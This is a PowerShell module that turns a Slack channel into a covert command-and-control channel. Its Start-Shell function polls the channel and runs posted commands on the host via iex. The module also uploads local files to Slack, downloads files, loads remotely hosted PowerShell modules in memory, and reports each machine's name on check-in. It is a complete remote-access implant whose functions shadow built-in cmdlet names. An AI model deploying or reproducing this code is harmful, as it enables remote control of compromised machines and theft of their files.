#requires -version 3

<#
Author: Brent Kennedy; @bk_up
First Published: 5/1/17
Last Updated: 5/31/18
#>
    

    function Send-Message {

        <# 
        .SYNOPSIS
        Sends a message to the specific Slack Channel through the API.

        .DESCRIPTION
        Sends a message to the specific Slack Channel through the API. Messages uses the Slack "text" field for a header and "attachment" field for the main body of the message.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER Channel
        Channel ID to monitor (must use ID number, not name).

        .PARAMETER Text 
        Main body of the message. This will be an "attachment" in the Slack API call. 

        .PARAMETER Header
        Header text for the message. This will be the "text" in the Slack API call.
        
        .EXAMPLE
        Send-Message -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3" -Channel "ABC123456" -Header "Message Header" -Text "Hell World!"

        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$channelID,
        [string]$text = "",
        [string]$header = "" 
        )

        Write-Verbose "[+] Sending $text"
        
        $chars = $text.Length

        #if more than 3,000 chars then the data must be uploaded as a snippet due to api limits
        DO 
        {
            If ($chars -gt 3000) {
                $tmp = $text.Substring(0,3000)
                $text = $text.Substring(3000)
                $chars = $text.Length
                }
            else {
                $chars = 0
                $tmp = $text
            }

            $attachment = Format-Table -InputObject $tmp | ConvertTo-Json
            $body = @{"token" = $token; "channel" = $channelID; "attachments" = $attachment; "as_user" = $true; "text" = $header}
            Invoke-RestMethod -Uri "https://slack.com/api/chat.postMessage" -Body $body
        } until ($chars -eq 0)  
    }


    function Invoke-Command {

        <# 
        .SYNOPSIS
        Executes a command in PowerShell on the host.

        .DESCRIPTION
        Executes a command in PowerShell on the host in the current context of the running process and returns the output.

        .PARAMETER Cmd
        The command to be executed. Can include paramters in a string value.

        .EXAMPLE
        Invoke-Command "hostname"

        #>

        param(
        [Parameter(Mandatory=$true)][string]$cmd
        )
        write-verbose "[+] Running $cmd"
        
        return iex $cmd | Out-String
    }


     function Get-SlackMessage {

        <# 
        .SYNOPSIS
        Returns all messages in a specific Slack channel from the oldest time period to present.

        .DESCRIPTION
        Returns all messages in a specific Slack channel from the oldest time period to present. Messages returned in JSON format per the API specifications.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER Channel
        Channel ID to monitor (must use ID number, not name).

        .PARAMETER Oldest
        The time (in epoch) of the oldest possible message.

        .EXAMPLE
        Get-SlackMessage -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3" -Channel "ABC123456" -Oldest 1234567890.123456

        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$channelID,
        $oldest
        )

        $body = @{"token" = $token; "channel" = $channelID; "oldest" = $oldest}

        Invoke-RestMethod -Uri "https://slack.com/api/channels.history" -Body $body
     }


    function Test-Connection {

        <# 
        .SYNOPSIS
        Determines if the API authentication token is valid.

        .DESCRIPTION
        Determines if the API authentication token is valid. Returns True or False.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .EXAMPLE
        Test-Connection -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3"

        #>
    
        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token
        )

        Write-Verbose "[+] Testing connection..."

        $body = @{"token" = $token}

        $ouput = Invoke-RestMethod -Uri "https://slack.com/api/auth.test" -Body $body
       
        return Select-Object -InputObject $ouput -ExpandProperty ok
    }


    function Invoke-Job {

        <# 
        
        .SYNOPSIS
        Starts a new prcess and executes a command in PowerShell on the host.

        .DESCRIPTION
        Starts a new process and executes a command in PowerShell on the host. Utilizes the Start-Job method in PowerShell to spawn a new process, wait for the job to finish, and return the output.
        
        .PARAMETER Cmd
        The command to be executed. Can include paramters in a string value.
        
        .EXAMPLE
        Invoke-Job "hostname"
        
        #>

        param(
        [Parameter(Mandatory=$true)][string]$cmd
        )

        $full = "powershell.exe -c $cmd"
        $Sb = [scriptblock]::Create($full)

        $output = Start-Job -ScriptBlock $sb | Wait-Job | Receive-Job
        return $output | Out-String
    }

    function Import-File {

        <# 
        .SYNOPSIS
        Downloads and imports a PS module.

        .DESCRIPTION
        Downloads a file from the Slack file respository based on its private URL and imports the file into the PS session, all in memory.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER File
        Full name of the file to download.

        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$file
        )

        #update file list
        Get-FileList -Token $token -Channel $ChannelID
        #lookup URL for file
        foreach ($name in $files) {
            if ($name.name.ToLower() -eq $file.ToLower()) {
                $url = $name.url_private
                }
        } 

        try {
            $A = Invoke-RestMethod -Uri "$url" -Headers @{"Authorization" = "Bearer $token";}
            New-Module -ScriptBlock ([ScriptBlock]::Create($A)) -Name $file | Import-Module
            $output = "$File imported sucessfully."
            }
        Catch {
            $output = "Error during import."
        }

        return $output
    }

    
    function Get-FileList {

        <# 
        .SYNOPSIS
        Returns list of files.

        .DESCRIPTION
        Queries the list of files from the Slack file respository, outputs the names, and updates global variable of file IDs.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER channelID
        Channel to look up shared files for. Files need to be shared within a channel so that bot and user can both access.

        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$channelID
        )

        $body = @{"token" = $token; "channel" = $channelID;}

        $global:files = Invoke-RestMethod -Uri "https://slack.com/api/files.list" -Body $body | Select-Object -ExpandProperty files | select id, name, url_private

    }

    function Receive-File {

        <# 
        .SYNOPSIS
        Downloads and save's a file to disk.

        .DESCRIPTION
        Downloads a file from the Slack file respository based on its private URL and stores it on the filesystem. 

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER File
        Full name of the file to download.

        .PARAMETER Path
        Filesystem path to store the file. Default is C:\.

        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$file,
        [Parameter(Position=2)][string]$path
        )

        #update file list
        Get-FileList -Token $token -Channel $ChannelID
        #lookup URL for file
        foreach ($name in $files) {
            if ($name.name.ToLower() -eq $file.ToLower()) {
                $url = $name.url_private
                }
        } 

        #set default file path
        if (-not $path) {
            $path = (Get-Item -Path ".\").FullName
            }

        try {
            Invoke-RestMethod -Uri "$url" -Headers @{"Authorization" = "Bearer $token";} -OutFile "$path\$file"
            $output = "Success downloading $file."
            }
        Catch {
            $output = "Error during download."
        }

        return $output
    }

    function Send-File {

        <# 
        .SYNOPSIS
        Uploads a file from the local filesystem.

        .DESCRIPTION
        Uploads a file to the Slack respository from the local filesystem using the API. 

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER Path
        Full pAth of the file to upload.

        .PARAMETER Channel
        Slack channel to share the file with.

        Credit for this function to the PSSlack Project (@RamblingCookieMonster)
        https://github.com/RamblingCookieMonster/PSSlack
        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$path,
        [Parameter(Mandatory=$true, Position=2)][string]$Channel
        )

        $fileName = (Split-Path -Path $path -Leaf)
        $path = "$pwd\$filename"

         $LF = "`r`n"
                $readFile = [System.IO.File]::ReadAllBytes($Path)
                $enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
                $fileEnc = $enc.GetString($readFile)
                $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines =
            "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
            "Content-Type: 'multipart/form-data'$LF$LF" +
            "$fileEnc$LF" +
            "--$boundary$LF" +
            "Content-Disposition: form-data; name=`"token`"$LF" +
            "Content-Type: 'multipart/form-data'$LF$LF" +
            "$token$LF"


        switch ($psboundparameters.keys) {
        'Channel'     {$bodyLines +=
                        ("--$boundary$LF" +
                        "Content-Disposition: form-data; name=`"channels`"$LF" +
                        "Content-Type: multipart/form-data$LF$LF" +
                        ($Channel -join ", ") + $LF)}
        'FileName'    {$bodyLines +=
                        ("--$boundary$LF" +
                        "Content-Disposition: form-data; name=`"filename`"$LF" +
                        "Content-Type: multipart/form-data$LF$LF" +
                        "$FileName$LF")}
                }
        $bodyLines += "--$boundary--$LF"
        
        try {
            $response = Invoke-RestMethod -Uri "https://slack.com/api/files.upload" -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
        }
        catch [System.Net.WebException] {
            Write-Error( "Rest call failed for $uri`: $_" )
            throw $_
        }
    }

    function Start-Shell {

        <# 
        .SYNOPSIS
        Starts the monitoring of a Slack Channel for commands to be executed in PowerShell.

        .DESCRIPTION
        Starts the monitoring of a Slack Channel for commands to be executed in PowerShell. Will connect to the Slack channel every $sleep seconds and pull all new commands.  Commands will be executed on the host in PowerShell.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER Channel
        Channel ID to monitor (must use ID number, not name).

        .PARAMETER Sleep
        The time (in seconds) between checks for commands. The deafult is 5 seconds.

        .EXAMPLE
        Start-Shell -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3" -Channel "ABC123456"

        #>

        [cmdletbinding()]
        param (
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$ChannelID,
        [int]$sleep = 5
        )

        #check API token
        if (-Not (Test-Connection -Token $token)) {
            Write-Output "API Token not Valid."
            return
        }

        Write-Verbose "[+] Connection okay, checking in..."
            
        #initial checkin
        $response = Send-Message -Token $token -Channel $ChannelID -Text $((Get-WmiObject -Class Win32_ComputerSystem | Select -expand Name) + " has Connected!") -Header "Connection"
        $oldestTime = $response.ts
        $kill = $false
    
        #loop until exit
        While (-Not $kill) {
        
            #sleep the loop
            Start-Sleep -s $sleep
        
            #getdata
            $responses = Get-SlackMessage -Token $token -Channel $ChannelID -Oldest $oldestTime | Select-Object -ExpandProperty Messages | Sort-Object ts
            Format-Table -InputObject $responses
            if ($responses) {
                #set oldest time to time of last message captured
                $oldestTime =  $responses[-1].ts

                foreach ($response in $responses) {
        
                    if ($response.text.ToLower() -eq 'exit') {
                        $kill = $true
                        Send-Message -Token $token -Channel $ChannelID -Text $((Get-WmiObject -Class Win32_ComputerSystem | Select -expand Name) + " has exited.") -Header "Exiting"
                        break
                        }
                
                    elseif ($response.text.StartsWith("cd","CurrentCultureIgnoreCase")) {
                        $var = Set-Location -PassThru $($response.text.substring(3))
                        Send-Message -Token $token -Channel $ChannelID -Text $var -Header $("Output of: " + $response.text)
                    }

                    elseif ($response.text.StartsWith("sleep","CurrentCultureIgnoreCase")) {
                        $sleep = $response.text.substring(6)
                        Send-Message -Token $token -Channel $ChannelID -Text $("Sleep set to " + $sleep + " seconds.") -Header $("Output of: " + $response.text)
                    }

                    elseif ($response.text.ToLower() -eq 'files') {
                        Get-FileList -Token $token -Channel $ChannelID
                        Send-Message -Token $token -Channel $ChannelID -Text $(Write-Output $files | select name | Out-String) -Header "Files available:"
                    }

                    elseif ($response.text.StartsWith("import","CurrentCultureIgnoreCase")) {
                        $file = $response.text.substring(7)
                        Send-Message -Token $token -Channel $ChannelID -Text $(Import-File -Token $token -File $file) -Header $("Output of: " + $response.text)
                    }

                    elseif ($response.text.StartsWith("download","CurrentCultureIgnoreCase")) {
                        $tmp = $response.text.substring(9)
                        if ($tmp -like "* *"){
                            $parts = $tmp.split(" ")
                            $file = $parts[0]
                            $path = $parts[1]
                            Send-Message -Token $token -Channel $ChannelID -Text $(Receive-File -Token $token -File $file -Path $path) -Header $("Output of: " + $response.text)
                        }
                        else {
                        Send-Message -Token $token -Channel $ChannelID -Text $(Receive-File -Token $token -File $tmp) -Header $("Output of: " + $response.text)
                        }
                    }

                    elseif ($response.text.StartsWith("upload","CurrentCultureIgnoreCase")) {
                        $path = $response.text.substring(7)
                        Send-File -Token $token -Path $path -Channel $ChannelID
                    }

                    elseif ($response.text.StartsWith("runjob","CurrentCultureIgnoreCase")) {
                        $cmd = $response.text.substring(7)
                        Send-Message -Token $token -Channel $ChannelID -Text $(Invoke-Job -Cmd $cmd) -Header $("Output of: " + $response.text)
                    }

                    #remaining input will be treated as a PS command if not a bot or output from file upload.
                    elseif ((-Not $response.bot_id) -and (-Not $response.subtype -eq "file_share")) {
                        Send-Message -Token $token -Channel $ChannelID -Text $(Invoke-Command -Cmd $response.text) -Header $("Output of: " + $response.text)
                    }

                }

            }
         }
    }

    Export-ModuleMember -Function Send-Message
    Export-ModuleMember -Function Invoke-Job
    Export-ModuleMember -Function Invoke-Command
    Export-ModuleMember -Function Get-SlackMessage
    Export-ModuleMember -Function Start-Shell
    Export-ModuleMember -Function Test-Connection
    Export-ModuleMember -Function Get-FileList
    Export-ModuleMember -Function Import-File
    Export-ModuleMember -Function Receive-File
    Export-ModuleMember -Function Send-File